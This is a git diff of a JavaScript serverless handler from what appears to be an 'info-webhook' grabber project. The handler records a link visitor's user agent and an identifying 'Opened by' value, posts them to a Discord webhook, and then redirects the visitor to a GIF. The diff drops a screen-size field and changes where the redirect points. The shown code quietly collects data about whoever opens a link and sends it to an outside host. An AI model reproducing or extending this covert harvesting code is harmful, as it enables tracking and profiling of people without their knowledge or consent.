@@ -33,11 +33,6 @@ export default async (req, res) => {
 
     const userAgent = req.headers["user-agent"] || "Unknown";
 
-    const screenSize =
-      req.headers["viewport-width"] && req.headers["viewport-height"]
-        ? `${req.headers["viewport-width"]}x${req.headers["viewport-height"]}`
-        : "Unknown";
-
     const openedBy = decodedData
       ? `Opened by: ${decodedData}`
       : "Opened by: Unknown";
@@ -72,11 +67,6 @@ export default async (req, res) => {
                 value: userAgent || "Unknown",
                 inline: true,
               },
-              {
-                name: "Screen Size",
-                value: req.headers,
-                inline: true,
-              },
             ],
             footer: {
               text: "github.com/crunny/info-webhook",
@@ -88,7 +78,7 @@ export default async (req, res) => {
     });
 
     // Redirect user to a website
-    res.redirect("https://www.google.com");
+    res.redirect("https://c.tenor.com/x8v1oNUOmg4AAAAd/tenor.gif");
 
     if (!discordWebhook.ok)
       throw new Error("Failed to send message to Discord webhook");
